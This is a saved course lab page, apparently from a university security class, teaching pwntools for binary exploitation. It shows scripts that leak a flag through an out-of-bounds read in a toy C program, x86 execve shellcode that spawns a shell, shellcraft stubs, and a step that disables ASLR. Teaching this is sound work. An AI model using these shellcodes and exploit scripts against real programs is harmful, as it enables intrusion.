@@ -1,0 +1,599 @@
+    
+    
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="utf-8" />
+  <title>cns:labs:lab-07</title>
+<meta name="generator" content="DokuWiki"/>
+<meta name="robots" content="index,follow"/>
+<meta name="date" content="2016-11-15T20:45:24+0200"/>
+<meta name="keywords" content="cns,labs,lab-07"/>
+<link rel="search" type="application/opensearchdescription+xml" href="../../../../lib/exe/opensearch.php" title="CS Open CourseWare"/>
+<link rel="start" href="../../../../../courses.1.html"/>
+<link rel="alternate" type="application/rss+xml" title="Recent Changes" href="../../../../feed.php"/>
+<link rel="alternate" type="application/rss+xml" title="Current Namespace" href="../../../../feed.php%3Fmode=list&amp;ns=cns:labs"/>
+<link rel="alternate" type="text/html" title="Plain HTML" href="lab-07.html"/>
+<link rel="canonical" href="../../../../cns/labs/lab-07.html"/>
+<link rel="stylesheet" type="text/css" href="../../../../lib/exe/css.php%3Ft=arctic&amp;tseed=1476798676.css"/>
+<script type="text/javascript">/*<![CDATA[*/var NS='cns:labs';var JSINFO = {"id":"cns:labs:lab-07","namespace":"cns:labs","isadmin":0,"isauth":0};
+/*!]]>*/</script>
+<script type="text/javascript" charset="utf-8" src="../../../../lib/exe/js.php%3Ftseed=1476798676"></script>
+<script type="text/x-mathjax-config">/*<![CDATA[*/MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+        displayMath: [ ["$$","$$"], ["\\[","\\]"] ],
+        processEscapes: true
+    }
+});
+/*!]]>*/</script>
+<script type="text/javascript" charset="utf-8" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS_HTML"></script>
+<script type="text/javascript">/*<![CDATA[*/
+var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+		  
+/*!]]>*/</script>
+<script type="text/javascript">/*<![CDATA[*/
+var pageTracker = _gat._getTracker("UA-38383934-1");
+pageTracker._initData();
+pageTracker._trackPageview();
+		  
+/*!]]>*/</script>
+</head>
+<body>
+<div class="dokuwiki export">
+<!-- TOC START -->
+<div id="dw__toc">
+<h3 class="toggle">Table of Contents</h3>
+<div>
+
+<ul class="toc">
+<li class="level1"><div class="li"><a href="lab-07.html#lab_07_-_exploiting_shellcodes_part_2">Lab 07 - Exploiting. Shellcodes (Part 2)</a></div>
+<ul class="toc">
+<li class="level2"><div class="li"><a href="lab-07.html#resources">Resources</a></div></li>
+<li class="level2"><div class="li"><a href="lab-07.html#lab_support_files">Lab Support Files</a></div></li>
+<li class="level2"><div class="li"><a href="lab-07.html#intro">Intro</a></div></li>
+<li class="level2"><div class="li"><a href="lab-07.html#pwntools_tutorial">Pwntools Tutorial</a></div>
+<ul class="toc">
+<li class="level3"><div class="li"><a href="lab-07.html#local_and_remote_io">Local and remote I/O</a></div></li>
+<li class="level3"><div class="li"><a href="lab-07.html#logging">Logging</a></div></li>
+<li class="level3"><div class="li"><a href="lab-07.html#assembly_and_elf_manipulation">Assembly and ELF manipulation</a></div></li>
+<li class="level3"><div class="li"><a href="lab-07.html#shellcode_generation">Shellcode generation</a></div></li>
+<li class="level3"><div class="li"><a href="lab-07.html#gdb_integration">GDB integration</a></div></li>
+</ul>
+</li>
+<li class="level2"><div class="li"><a href="lab-07.html#tasks">Tasks</a></div>
+<ul class="toc">
+<li class="level3"><div class="li"><a href="lab-07.html#passing_shellcode_through_the_environment_3p">1. Passing shellcode through the environment [3p]</a></div></li>
+<li class="level3"><div class="li"><a href="lab-07.html#multistage_exploit_7p">2. Multistage exploit [7p]</a></div>
+<ul class="toc">
+<li class="level4"><div class="li"><a href="lab-07.html#a_leak_the_buffer_address_2p">a. Leak the buffer address [2p]</a></div></li>
+<li class="level4"><div class="li"><a href="lab-07.html#b_construct_the_first_stage_2p">b. Construct the first stage [2p]</a></div></li>
+<li class="level4"><div class="li"><a href="lab-07.html#c_construct_the_second_stage_3p">c. Construct the second stage [3p]</a></div></li>
+</ul></li>
+</ul></li>
+</ul></li>
+</ul>
+</div>
+</div>
+<!-- TOC END -->
+
+<h1 class="sectionedit1" id="lab_07_-_exploiting_shellcodes_part_2">Lab 07 - Exploiting. Shellcodes (Part 2)</h1>
+<div class="level1">
+
+</div>
+<!-- EDIT1 SECTION "Lab 07 - Exploiting. Shellcodes (Part 2)" [1-56] -->
+<h2 class="sectionedit2" id="resources">Resources</h2>
+<div class="level2">
+<ul>
+<li class="level1"><div class="li"> <a href="http://shell-storm.org/shellcode/" class="urlextern" title="http://shell-storm.org/shellcode/"  rel="nofollow">Shellstorm - A collection of shellcodes</a></div>
+</li>
+<li class="level1"><div class="li"> <a href="https://trailofbits.github.io/ctf/exploits/README.html" class="urlextern" title="https://trailofbits.github.io/ctf/exploits/README.html"  rel="nofollow">TrailofBits guide to exploiting binaries</a></div>
+</li>
+<li class="level1"><div class="li"> <a href="http://security.cs.pub.ro/hexcellents/wiki/" class="urlextern" title="http://security.cs.pub.ro/hexcellents/wiki/"  rel="nofollow">Hexcellents - A collection of binary exploitation resources</a></div>
+</li>
+<li class="level1"><div class="li"> <a href="https://docs.pwntools.com/en/stable/" class="urlextern" title="https://docs.pwntools.com/en/stable/"  rel="nofollow">Pwntools Documentation</a></div>
+</li>
+</ul>
+
+</div>
+<!-- EDIT2 SECTION "Resources" [57-446] -->
+<h2 class="sectionedit3" id="lab_support_files">Lab Support Files</h2>
+<div class="level2">
+
+<p>
+We will use this <a href="http://elf.cs.pub.ro/oss/res/labs/lab-07.tar.gz" class="urlextern" title="http://elf.cs.pub.ro/oss/res/labs/lab-07.tar.gz"  rel="nofollow">lab archive</a> throughout the lab.
+</p>
+
+<p>
+Please download the lab archive an then unpack it using the commands below:
+</p>
+<pre class="code bash"><span class="co4">student@mjolnir:~$ </span><span class="kw2">wget</span> http:<span class="sy0">//</span>elf.cs.pub.ro<span class="sy0">/</span>oss<span class="sy0">/</span>res<span class="sy0">/</span>labs<span class="sy0">/</span>lab-07.tar.gz
+<span class="co4">student@mjolnir:~$ </span><span class="kw2">tar</span> xzf lab-07.tar.gz</pre>
+
+<p>
+After unpacking we will get the <code>lab-07/</code> folder that we will use for the lab:
+</p>
+<pre class="code bash"><span class="co4">student@mjolnir:~$ </span><span class="kw3">cd</span> lab-07<span class="sy0">/</span>
+student<span class="sy0">@</span>mjolnir:~<span class="sy0">/</span>lab-07$ <span class="kw2">ls</span>
+<span class="nu0">1</span>_env_var  <span class="nu0">2</span>_640k</pre>
+
+</div>
+<!-- EDIT3 SECTION "Lab Support Files" [447-970] -->
+<h2 class="sectionedit4" id="intro">Intro</h2>
+<div class="level2">
+
+<p>
+Starting from where we left off last session, you will find that in real-life scenarios, vulnerabilities leave you very little room to play with, so you have to be creative with your exploits.
+</p>
+
+<p>
+<p><div class="noteimportant">
+Again, for this lab, we will be disabling ASLR as follows:
+</p>
+<pre class="code bash"><span class="kw3">echo</span> <span class="nu0">0</span> <span class="sy0">|</span> <span class="kw2">sudo</span> <span class="kw2">tee</span> <span class="sy0">/</span>proc<span class="sy0">/</span>sys<span class="sy0">/</span>kernel<span class="sy0">/</span>randomize_va_space</pre>
+
+<p>
+
+</div></p>
+</p>
+
+</div>
+<!-- EDIT4 SECTION "Intro" [971-1343] -->
+<h2 class="sectionedit5" id="pwntools_tutorial">Pwntools Tutorial</h2>
+<div class="level2">
+
+<p>
+Even though <code>pwntools</code> is an excellent CTF framework, it is also an exploit development library. It was developed by Gallopsled, a European CTF team, under the context that exploit developers have been writing the same tools over and over again with different variations. Pwntools comes to level the playing field and bring together developers to create a common framework of tools.
+</p>
+
+</div>
+<!-- EDIT5 SECTION "Pwntools Tutorial" [1344-1760] -->
+<h3 class="sectionedit6" id="local_and_remote_io">Local and remote I/O</h3>
+<div class="level3">
+
+<p>
+Pwntools enables you to dynamically interact (through scripting) with either local or remote processes, as follows:
+</p>
+<pre class="code python">IP <span class="sy0">=</span> <span class="st0">'10.11.12.13'</span>
+PORT <span class="sy0">=</span> <span class="nu0">1337</span>
+local <span class="sy0">=</span> <span class="kw2">False</span>
+<span class="kw1">if</span> <span class="kw1">not</span> local:
+    io <span class="sy0">=</span> remote<span class="br0">&#40;</span>IP<span class="sy0">,</span> PORT<span class="br0">&#41;</span>
+<span class="kw1">else</span>:
+    io <span class="sy0">=</span> process<span class="br0">&#40;</span><span class="st0">'/path/to/binary'</span><span class="br0">&#41;</span>
+&nbsp;
+io.<span class="me1">interactive</span><span class="br0">&#40;</span><span class="br0">&#41;</span></pre>
+
+<p>
+We can send and receive data from a local or remote process via <code>send</code>, <code>sendline</code>, <code>recv</code>, <code>recvline</code> and <code>recvuntil</code>.
+</p>
+
+<p>
+Let&#039;s construct a complete example in which we interact with a local process.
+</p>
+<pre class="code C"><span class="co2">#include &lt;stdio.h&gt;</span>
+&nbsp;
+<span class="kw4">int</span> main<span class="br0">&#40;</span><span class="kw4">int</span> argc<span class="sy0">,</span> <span class="kw4">char</span><span class="sy0">*</span> argv<span class="br0">&#91;</span><span class="br0">&#93;</span><span class="br0">&#41;</span>
+<span class="br0">&#123;</span>
+	<span class="kw4">char</span> flag<span class="br0">&#91;</span><span class="nu0">10</span><span class="br0">&#93;</span> <span class="sy0">=</span> <span class="br0">&#123;</span><span class="st0">'S'</span><span class="sy0">,</span> <span class="st0">'E'</span><span class="sy0">,</span> <span class="st0">'C'</span><span class="sy0">,</span> <span class="st0">'R'</span><span class="sy0">,</span> <span class="st0">'E'</span><span class="sy0">,</span> <span class="st0">'T'</span><span class="sy0">,</span> <span class="st0">'F'</span><span class="sy0">,</span> <span class="st0">'L'</span><span class="sy0">,</span> <span class="st0">'A'</span><span class="sy0">,</span> <span class="st0">'G'</span><span class="br0">&#125;</span><span class="sy0">;</span>
+	<span class="kw4">char</span> digits<span class="br0">&#91;</span><span class="nu0">10</span><span class="br0">&#93;</span> <span class="sy0">=</span> <span class="br0">&#123;</span><span class="st0">'0'</span><span class="sy0">,</span> <span class="st0">'1'</span><span class="sy0">,</span> <span class="st0">'2'</span><span class="sy0">,</span> <span class="st0">'3'</span><span class="sy0">,</span> <span class="st0">'4'</span><span class="sy0">,</span> <span class="st0">'5'</span><span class="sy0">,</span> <span class="st0">'6'</span><span class="sy0">,</span> <span class="st0">'7'</span><span class="sy0">,</span> <span class="st0">'8'</span><span class="sy0">,</span> <span class="st0">'9'</span><span class="br0">&#125;</span><span class="sy0">;</span>
+	<span class="kw4">int</span> index <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
+&nbsp;
+	<span class="kw1">while</span> <span class="br0">&#40;</span><span class="nu0">1</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
+		<a href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span class="kw3">printf</span></a><span class="br0">&#40;</span><span class="st0">&quot;Give me an index and I'll tell you what's there!<span class="es1">\n</span>&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
+		<a href="http://www.opengroup.org/onlinepubs/009695399/functions/scanf.html"><span class="kw3">scanf</span></a><span class="br0">&#40;</span><span class="st0">&quot;%d&quot;</span><span class="sy0">,</span> <span class="sy0">&amp;</span>index<span class="br0">&#41;</span><span class="sy0">;</span>
+		<a href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span class="kw3">printf</span></a><span class="br0">&#40;</span><span class="st0">&quot;Okay, here you go: %p %c<span class="es1">\n</span>&quot;</span><span class="sy0">,</span> <span class="sy0">&amp;</span>digits<span class="br0">&#91;</span>index<span class="br0">&#93;</span><span class="sy0">,</span> digits<span class="br0">&#91;</span>index<span class="br0">&#93;</span><span class="br0">&#41;</span><span class="sy0">;</span>
+	<span class="br0">&#125;</span>
+	<span class="kw1">return</span> <span class="nu0">0</span><span class="sy0">;</span>
+<span class="br0">&#125;</span></pre>
+
+<p>
+Let&#039;s leak one byte of the flag using pwntools.
+</p>
+<pre class="code python"><span class="co1">#!/usr/bin/env python</span>
+<span class="kw1">from</span> pwn <span class="kw1">import</span> *
+&nbsp;
+io <span class="sy0">=</span> process<span class="br0">&#40;</span><span class="st0">'leaky'</span><span class="br0">&#41;</span>
+&nbsp;
+<span class="co1"># &quot;Give me an index and I'll tell you what's there!\n</span>
+io.<span class="me1">recvline</span><span class="br0">&#40;</span><span class="br0">&#41;</span>
+&nbsp;
+<span class="co1"># Send offset -10</span>
+io.<span class="me1">sendline</span><span class="br0">&#40;</span><span class="st0">'-10'</span><span class="br0">&#41;</span>
+&nbsp;
+<span class="co1"># Here you go\n</span>
+result <span class="sy0">=</span> io.<span class="me1">recvline</span><span class="br0">&#40;</span><span class="br0">&#41;</span>
+&nbsp;
+<span class="kw1">print</span> <span class="st0">&quot;Got: &quot;</span> + result
+&nbsp;
+io.<span class="me1">interactive</span><span class="br0">&#40;</span><span class="br0">&#41;</span></pre>
+
+<p>
+If we run the previous script, we get the following output:
+</p>
+<pre class="code bash"><span class="br0">&#91;</span>+<span class="br0">&#93;</span> Starting <span class="kw3">local</span> process <span class="st_h">'./leaky'</span>: Done
+Got: Okay, here you go: 0xffe947d8 S
+&nbsp;
+<span class="br0">&#91;</span><span class="sy0">*</span><span class="br0">&#93;</span> Switching to interactive mode
+<span class="br0">&#91;</span><span class="sy0">*</span><span class="br0">&#93;</span> Process <span class="st_h">'./leaky'</span> stopped with <span class="kw3">exit</span> code <span class="nu0">0</span>
+<span class="br0">&#91;</span><span class="sy0">*</span><span class="br0">&#93;</span> Got EOF <span class="kw1">while</span> reading <span class="kw1">in</span> interactive
+$  </pre>
+
+<p>
+Notice the <code>$</code> prompt which still awaits input from us to feed the process. This is due to the <code>io.interactive()</code> line at the end of the script.
+</p>
+
+<p>
+We can encapsulate the previous sequence of interactions inside a function which we can loop.
+</p>
+<pre class="code python"><span class="co1">#!/usr/bin/env python</span>
+<span class="kw1">from</span> pwn <span class="kw1">import</span> *
+&nbsp;
+<span class="kw1">def</span> leak_char<span class="br0">&#40;</span>offset<span class="br0">&#41;</span>:
+    <span class="co1"># &quot;Give me an index and I'll tell you what's there!\n</span>
+    io.<span class="me1">recvline</span><span class="br0">&#40;</span><span class="br0">&#41;</span>
+&nbsp;
+    <span class="co1"># Send offset</span>
+    io.<span class="me1">sendline</span><span class="br0">&#40;</span><span class="kw2">str</span><span class="br0">&#40;</span>offset<span class="br0">&#41;</span><span class="br0">&#41;</span>
+&nbsp;
+    <span class="co1"># Here you go\n</span>
+    result <span class="sy0">=</span> io.<span class="me1">recvline</span><span class="br0">&#40;</span><span class="br0">&#41;</span>
+&nbsp;
+    <span class="co1"># Parse the result</span>
+    leaked_char <span class="sy0">=</span> result.<span class="me1">split</span><span class="br0">&#40;</span><span class="st0">'go: '</span><span class="br0">&#41;</span><span class="br0">&#91;</span><span class="nu0">1</span><span class="br0">&#93;</span>.<span class="me1">split</span><span class="br0">&#40;</span><span class="st0">' '</span><span class="br0">&#41;</span><span class="br0">&#91;</span><span class="nu0">1</span><span class="br0">&#93;</span>.<span class="me1">split</span><span class="br0">&#40;</span><span class="st0">'<span class="es0">\n</span>'</span><span class="br0">&#41;</span><span class="br0">&#91;</span><span class="nu0">0</span><span class="br0">&#93;</span>
+    <span class="kw1">return</span> leaked_char
+&nbsp;
+io <span class="sy0">=</span> process<span class="br0">&#40;</span><span class="st0">'leaky'</span><span class="br0">&#41;</span>
+&nbsp;
+flag <span class="sy0">=</span> <span class="st0">''</span>
+&nbsp;
+<span class="kw1">for</span> i <span class="kw1">in</span> <span class="kw2">range</span><span class="br0">&#40;</span>-<span class="nu0">10</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">&#41;</span>:
+    flag +<span class="sy0">=</span> leak_char<span class="br0">&#40;</span>i<span class="br0">&#41;</span>
+&nbsp;
+<span class="kw1">print</span> <span class="st0">&quot;The flag is: &quot;</span> + flag
+io.<span class="me1">close</span><span class="br0">&#40;</span><span class="br0">&#41;</span></pre>
+
+<p>
+If we run this script, we leak the flag.
+</p>
+<pre class="code bash">$ .<span class="sy0">/</span>demo_pwn.py 
+<span class="br0">&#91;</span>+<span class="br0">&#93;</span> Starting <span class="kw3">local</span> process <span class="st_h">'./leaky'</span>: Done
+The flag is: SECRETFLAG
+<span class="br0">&#91;</span><span class="sy0">*</span><span class="br0">&#93;</span> Stopped program <span class="st_h">'./leaky'</span></pre>
+
+</div>
+<!-- EDIT6 SECTION "Local and remote I/O" [1761-4240] -->
+<h3 class="sectionedit7" id="logging">Logging</h3>
+<div class="level3">
+
+<p>
+The previous example was a bit… quiet. Fortunately, <code>pwntools</code> has nicely separated logging capabilities to make things more verbose for debugging and progress-viewing purposes. Let&#039;s log each of our steps within the <code>leak_char</code> function.
+</p>
+<pre class="code python"><span class="kw1">def</span> leak_char<span class="br0">&#40;</span>offset<span class="br0">&#41;</span>:
+    <span class="co1"># &quot;Give me an index and I'll tell you what's there!\n</span>
+    io.<span class="me1">recvline</span><span class="br0">&#40;</span><span class="br0">&#41;</span>
+&nbsp;
+    <span class="co1"># Send offset</span>
+    log.<span class="me1">info</span><span class="br0">&#40;</span><span class="st0">&quot;Sending request for offset: &quot;</span> + <span class="kw2">str</span><span class="br0">&#40;</span>offset<span class="br0">&#41;</span><span class="br0">&#41;</span>
+    io.<span class="me1">sendline</span><span class="br0">&#40;</span><span class="kw2">str</span><span class="br0">&#40;</span>offset<span class="br0">&#41;</span><span class="br0">&#41;</span>
+&nbsp;
+    <span class="co1"># Here you go\n</span>
+    result <span class="sy0">=</span> io.<span class="me1">recvline</span><span class="br0">&#40;</span><span class="br0">&#41;</span>
+    log.<span class="me1">info</span><span class="br0">&#40;</span><span class="st0">&quot;Got back raw response: &quot;</span> + result<span class="br0">&#41;</span>
+&nbsp;
+    <span class="co1"># Parse the result</span>
+    leaked_char <span class="sy0">=</span> result.<span class="me1">split</span><span class="br0">&#40;</span><span class="st0">'go: '</span><span class="br0">&#41;</span><span class="br0">&#91;</span><span class="nu0">1</span><span class="br0">&#93;</span>.<span class="me1">split</span><span class="br0">&#40;</span><span class="st0">' '</span><span class="br0">&#41;</span><span class="br0">&#91;</span><span class="nu0">1</span><span class="br0">&#93;</span>.<span class="me1">split</span><span class="br0">&#40;</span><span class="st0">'<span class="es0">\n</span>'</span><span class="br0">&#41;</span><span class="br0">&#91;</span><span class="nu0">0</span><span class="br0">&#93;</span>
+    log.<span class="me1">info</span><span class="br0">&#40;</span><span class="st0">&quot;Parsed char: &quot;</span> + leaked_char<span class="br0">&#41;</span>
+    <span class="kw1">return</span> leaked_char</pre>
+
+<p>
+Now the output should be much more verbose:
+</p>
+<pre class="code bash"><span class="br0">&#91;</span>+<span class="br0">&#93;</span> Starting <span class="kw3">local</span> process <span class="st_h">'./leaky'</span>: Done
+<span class="br0">&#91;</span><span class="sy0">*</span><span class="br0">&#93;</span> Sending request <span class="kw1">for</span> offset: <span class="re5">-10</span>
+<span class="br0">&#91;</span><span class="sy0">*</span><span class="br0">&#93;</span> Got back raw response: Okay, here you go: 0xffb14948 S
+<span class="br0">&#91;</span><span class="sy0">*</span><span class="br0">&#93;</span> Parsed char: S
+<span class="br0">&#91;</span><span class="sy0">*</span><span class="br0">&#93;</span> Sending request <span class="kw1">for</span> offset: <span class="re5">-9</span>
+<span class="br0">&#91;</span><span class="sy0">*</span><span class="br0">&#93;</span> Got back raw response: Okay, here you go: 0xffb14949 E
+<span class="br0">&#91;</span><span class="sy0">*</span><span class="br0">&#93;</span> Parsed char: E
+<span class="br0">&#91;</span><span class="sy0">*</span><span class="br0">&#93;</span> Sending request <span class="kw1">for</span> offset: <span class="re5">-8</span>
+<span class="br0">&#91;</span><span class="sy0">*</span><span class="br0">&#93;</span> Got back raw response: Okay, here you go: 0xffb1494a C
+<span class="br0">&#91;</span><span class="sy0">*</span><span class="br0">&#93;</span> Parsed char: C
+<span class="br0">&#91;</span><span class="sy0">*</span><span class="br0">&#93;</span> Sending request <span class="kw1">for</span> offset: <span class="re5">-7</span>
+<span class="br0">&#91;</span><span class="sy0">*</span><span class="br0">&#93;</span> Got back raw response: Okay, here you go: 0xffb1494b R
+<span class="br0">&#91;</span><span class="sy0">*</span><span class="br0">&#93;</span> Parsed char: R
+<span class="br0">&#91;</span><span class="sy0">*</span><span class="br0">&#93;</span> Sending request <span class="kw1">for</span> offset: <span class="re5">-6</span>
+<span class="br0">&#91;</span><span class="sy0">*</span><span class="br0">&#93;</span> Got back raw response: Okay, here you go: 0xffb1494c E
+<span class="br0">&#91;</span><span class="sy0">*</span><span class="br0">&#93;</span> Parsed char: E
+<span class="br0">&#91;</span><span class="sy0">*</span><span class="br0">&#93;</span> Sending request <span class="kw1">for</span> offset: <span class="re5">-5</span>
+<span class="br0">&#91;</span><span class="sy0">*</span><span class="br0">&#93;</span> Got back raw response: Okay, here you go: 0xffb1494d T
+<span class="br0">&#91;</span><span class="sy0">*</span><span class="br0">&#93;</span> Parsed char: T
+<span class="br0">&#91;</span><span class="sy0">*</span><span class="br0">&#93;</span> Sending request <span class="kw1">for</span> offset: <span class="re5">-4</span>
+<span class="br0">&#91;</span><span class="sy0">*</span><span class="br0">&#93;</span> Got back raw response: Okay, here you go: 0xffb1494e F
+<span class="br0">&#91;</span><span class="sy0">*</span><span class="br0">&#93;</span> Parsed char: F
+<span class="br0">&#91;</span><span class="sy0">*</span><span class="br0">&#93;</span> Sending request <span class="kw1">for</span> offset: <span class="re5">-3</span>
+<span class="br0">&#91;</span><span class="sy0">*</span><span class="br0">&#93;</span> Got back raw response: Okay, here you go: 0xffb1494f L
+<span class="br0">&#91;</span><span class="sy0">*</span><span class="br0">&#93;</span> Parsed char: L
+<span class="br0">&#91;</span><span class="sy0">*</span><span class="br0">&#93;</span> Sending request <span class="kw1">for</span> offset: <span class="re5">-2</span>
+<span class="br0">&#91;</span><span class="sy0">*</span><span class="br0">&#93;</span> Got back raw response: Okay, here you go: 0xffb14950 A
+<span class="br0">&#91;</span><span class="sy0">*</span><span class="br0">&#93;</span> Parsed char: A
+<span class="br0">&#91;</span><span class="sy0">*</span><span class="br0">&#93;</span> Sending request <span class="kw1">for</span> offset: <span class="re5">-1</span>
+<span class="br0">&#91;</span><span class="sy0">*</span><span class="br0">&#93;</span> Got back raw response: Okay, here you go: 0xffb14951 G
+<span class="br0">&#91;</span><span class="sy0">*</span><span class="br0">&#93;</span> Parsed char: G
+<span class="br0">&#91;</span><span class="sy0">*</span><span class="br0">&#93;</span> The flag is: SECRETFLAG
+<span class="br0">&#91;</span><span class="sy0">*</span><span class="br0">&#93;</span> Stopped program <span class="st_h">'./leaky'</span></pre>
+
+</div>
+<!-- EDIT7 SECTION "Logging" [4241-6291] -->
+<h3 class="sectionedit8" id="assembly_and_elf_manipulation">Assembly and ELF manipulation</h3>
+<div class="level3">
+
+<p>
+Pwntools can also be used for precision work, like working with ELF files and their symbols.
+</p>
+<pre class="code python"><span class="co1">#!/usr/bin/env python</span>
+<span class="kw1">from</span> pwn <span class="kw1">import</span> *
+&nbsp;
+leaky_elf <span class="sy0">=</span> ELF<span class="br0">&#40;</span><span class="st0">'leaky'</span><span class="br0">&#41;</span>
+main_addr <span class="sy0">=</span> leaky_elf.<span class="me1">symbols</span><span class="br0">&#91;</span><span class="st0">'main'</span><span class="br0">&#93;</span>
+&nbsp;
+<span class="co1"># Print address of main</span>
+log.<span class="me1">info</span><span class="br0">&#40;</span><span class="st0">&quot;Main at: &quot;</span> + <span class="kw2">hex</span><span class="br0">&#40;</span>main_addr<span class="br0">&#41;</span><span class="br0">&#41;</span>
+&nbsp;
+<span class="co1"># Disassemble the first 14 bytes of main</span>
+log.<span class="me1">info</span><span class="br0">&#40;</span>disasm<span class="br0">&#40;</span>leaky_elf.<span class="me1">read</span><span class="br0">&#40;</span>main_addr<span class="sy0">,</span> <span class="nu0">14</span><span class="br0">&#41;</span><span class="sy0">,</span> arch<span class="sy0">=</span><span class="st0">'x86'</span><span class="br0">&#41;</span><span class="br0">&#41;</span></pre>
+
+<p>
+We can also write ELF files from raw assembly; this is very useful for testing shellcodes.
+</p>
+<pre class="code python"><span class="co1">#!/usr/bin/env python</span>
+<span class="kw1">from</span> pwn <span class="kw1">import</span> *
+&nbsp;
+sh_shellcode <span class="sy0">=</span> <span class="st0">&quot;&quot;&quot;
+        mov eax, 11
+        push 0
+        push 0x68732f6e
+        push 0x69622f2f
+        mov ebx, esp
+        mov ecx, 0
+        mov edx, 0
+        int 0x80 
+&quot;&quot;&quot;</span>
+&nbsp;
+e <span class="sy0">=</span> ELF.<span class="me1">from_assembly</span><span class="br0">&#40;</span>sh_shellcode<span class="sy0">,</span> vma<span class="sy0">=</span><span class="nu0">0x400000</span><span class="br0">&#41;</span>
+&nbsp;
+<span class="kw1">with</span> <span class="kw2">open</span><span class="br0">&#40;</span><span class="st0">'test_shell'</span><span class="sy0">,</span> <span class="st0">'wb'</span><span class="br0">&#41;</span> <span class="kw1">as</span> f:
+    f.<span class="me1">write</span><span class="br0">&#40;</span>e.<span class="me1">get_data</span><span class="br0">&#40;</span><span class="br0">&#41;</span><span class="br0">&#41;</span></pre>
+
+</div>
+<!-- EDIT8 SECTION "Assembly and ELF manipulation" [6292-7172] -->
+<h3 class="sectionedit9" id="shellcode_generation">Shellcode generation</h3>
+<div class="level3">
+
+<p>
+Pwntools comes with the <code>shellcraft</code> module, which is quite extensive in its capabilities.
+</p>
+<pre class="code asm">print shellcraft<span class="sy1">.</span>read<span class="br0">&#40;</span><span class="nu0">0</span><span class="sy1">,</span> <span class="nu0">0xffffeeb0</span><span class="sy1">,</span> <span class="nu0">20</span><span class="br0">&#41;</span> # Construct a shellcode which reads from stdin to a buffer on the <span class="kw5">stack</span> <span class="nu0">20</span> bytes
+    <span class="sy1">/*</span> <span class="kw1">call</span> read<span class="br0">&#40;</span><span class="nu0">0</span><span class="sy1">,</span> <span class="nu0">0xffffeeb0</span><span class="sy1">,</span> <span class="nu0">0x14</span><span class="br0">&#41;</span> <span class="sy1">*/</span>
+    <span class="kw1">push</span> <span class="br0">&#40;</span>SYS_read<span class="br0">&#41;</span> <span class="sy1">/*</span> <span class="nu0">3</span> <span class="sy1">*/</span>
+    <span class="kw1">pop</span> <span class="kw4">eax</span>
+    <span class="kw1">xor</span> <span class="kw4">ebx</span><span class="sy1">,</span> <span class="kw4">ebx</span>
+    <span class="kw1">push</span> <span class="nu0">0xffffeeb0</span>
+    <span class="kw1">pop</span> <span class="kw4">ecx</span>
+    <span class="kw1">push</span> <span class="nu0">0x14</span>
+    <span class="kw1">pop</span> <span class="kw4">edx</span>
+    <span class="kw1">int</span> <span class="nu0">0x80</span></pre>
+
+<p>
+It also works with other architectures:
+</p>
+<pre class="code asm">print shellcraft<span class="sy1">.</span>arm<span class="sy1">.</span>read<span class="br0">&#40;</span><span class="nu0">0</span><span class="sy1">,</span> <span class="nu0">0xffffeeb0</span><span class="sy1">,</span> <span class="nu0">20</span><span class="br0">&#41;</span>
+    <span class="sy1">/*</span> <span class="kw1">call</span> read<span class="br0">&#40;</span><span class="nu0">0</span><span class="sy1">,</span> <span class="nu0">4294962864</span><span class="sy1">,</span> <span class="nu0">20</span><span class="br0">&#41;</span> <span class="sy1">*/</span>
+    eor  r0<span class="sy1">,</span> r0 <span class="sy1">/*</span> <span class="nu0">0</span> <span class="br0">&#40;</span>#<span class="nu0">0</span><span class="br0">&#41;</span> <span class="sy1">*/</span>
+    movw r1<span class="sy1">,</span> #<span class="nu0">0xffffeeb0</span> &amp; <span class="nu0">0xffff</span>
+    movt r1<span class="sy1">,</span> #<span class="nu0">0xffffeeb0</span> &gt;&gt; <span class="nu0">16</span>
+    <span class="kw1">mov</span>  r2<span class="sy1">,</span> #<span class="nu0">0x14</span>
+    <span class="kw1">mov</span>  r7<span class="sy1">,</span> #<span class="br0">&#40;</span>SYS_read<span class="br0">&#41;</span> <span class="sy1">/*</span> <span class="nu0">3</span> <span class="sy1">*/</span>
+    svc  <span class="nu0">0</span>
+&nbsp;
+print shellcraft<span class="sy1">.</span>mips<span class="sy1">.</span>read<span class="br0">&#40;</span><span class="nu0">0</span><span class="sy1">,</span> <span class="nu0">0xffffeeb0</span><span class="sy1">,</span> <span class="nu0">20</span><span class="br0">&#41;</span>
+    <span class="sy1">/*</span> <span class="kw1">call</span> read<span class="br0">&#40;</span><span class="nu0">0</span><span class="sy1">,</span> <span class="nu0">0xffffeeb0</span><span class="sy1">,</span> <span class="nu0">0x14</span><span class="br0">&#41;</span> <span class="sy1">*/</span>
+    slti <span class="sy2">$</span>a0<span class="sy1">,</span> <span class="sy2">$</span>zero<span class="sy1">,</span> <span class="nu0">0xFFFF</span> <span class="sy1">/*</span> <span class="sy2">$</span>a0 = <span class="nu0">0</span> <span class="sy1">*/</span>
+    li <span class="sy2">$</span>a1<span class="sy1">,</span> <span class="nu0">0xffffeeb0</span>
+    li <span class="sy2">$</span>t9<span class="sy1">,</span> ~<span class="nu0">0x14</span>
+    <span class="kw1">not</span> <span class="sy2">$</span>a2<span class="sy1">,</span> <span class="sy2">$</span>t9
+    li <span class="sy2">$</span>t9<span class="sy1">,</span> ~<span class="br0">&#40;</span>SYS_read<span class="br0">&#41;</span> <span class="sy1">/*</span> <span class="nu0">0xfa3</span> <span class="sy1">*/</span>
+    <span class="kw1">not</span> <span class="sy2">$</span>v0<span class="sy1">,</span> <span class="sy2">$</span>t9
+    <span class="kw1">syscall</span> <span class="nu0">0x40404</span></pre>
+
+<p>
+These shellcodes can be directly assembled using <code>asm</code> inside your script, and given to the exploited process via the <code>send*</code> functions.
+</p>
+
+</div>
+<!-- EDIT9 SECTION "Shellcode generation" [7173-8314] -->
